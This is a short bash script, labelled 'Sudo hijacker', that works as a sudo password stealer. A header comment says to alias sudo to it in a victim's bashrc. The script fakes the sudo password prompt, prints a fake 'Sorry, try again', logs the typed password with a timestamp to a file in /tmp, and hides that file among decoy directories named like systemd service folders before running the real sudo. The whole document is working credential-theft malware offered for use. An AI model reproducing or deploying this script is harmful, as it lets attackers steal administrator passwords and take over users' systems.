#! /bin/bash

#@ author: xubzero
#@ title: Sudo hijacker
#@ description: Sudo hijacker - Simple sudo password stealer

#@ note: add the following line in bashrc :
#        alias sudo="/location-to_sudojack.sh"

arguments=${#}


if [ "$arguments" -gt 0 ]
then
	main="/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-systemd-networkd.service-hnPA50"
	OUTFILE="$main/pass.txt"

	# Creating diversion folders
	mkdir -p "/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-bolt.service-xcDAKf" 2>/dev/null 1>/dev/null
	mkdir -p "/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-colord.service-nFauy1" 2>/dev/null 1>/dev/null
	mkdir -p "/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-fwupd.service-79LnSR" 2>/dev/null 1>/dev/null
	mkdir -p "/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-ModemManager.service-L2nWBO" 2>/dev/null 1>/dev/null
	mkdir -p "/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-rtkit-daemon.service-BWT6QM" 2>/dev/null 1>/dev/null
	mkdir -p "/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-systemd-resolved.service-Jim6rW" 2>/dev/null 1>/dev/null
	mkdir -p "/tmp/systemd-private-6a8db2c4fb8f4921a59fb3gcdf14fdbb-systemd-timesyncd.service-hnPA50" 2>/dev/null 1>/dev/null
	mkdir -p "$main" 2>/dev/null



	read -sp "[sudo] password for $USER: " PASS
	echo ""
	sleep 1
	echo "Sorry, try again."

	DATE=`date`
	echo "[ $DATE ] => $PASS" >> $OUTFILE


	sudo "$@"

else
	sudo
fi


